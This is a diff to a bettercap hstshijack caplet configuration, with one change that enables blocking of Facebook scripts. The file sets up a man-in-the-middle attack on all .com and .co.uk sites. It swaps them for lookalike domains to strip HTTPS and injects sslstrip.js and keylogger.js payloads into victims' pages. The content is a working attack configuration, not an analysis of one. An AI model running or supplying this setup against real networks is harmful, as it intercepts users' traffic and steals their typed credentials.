@@ -9,7 +9,7 @@ set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl
 set hstshijack.ignore          *
 set hstshijack.targets         *.com, *.co.uk
 set hstshijack.replacements    *.corn,*.cc.uk
-#set hstshijack.blockscripts    facebook.com,*.facebook.com
+set hstshijack.blockscripts    facebook.com,*.facebook.com
 set hstshijack.obfuscate       false
 set hstshijack.encode          true
 set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
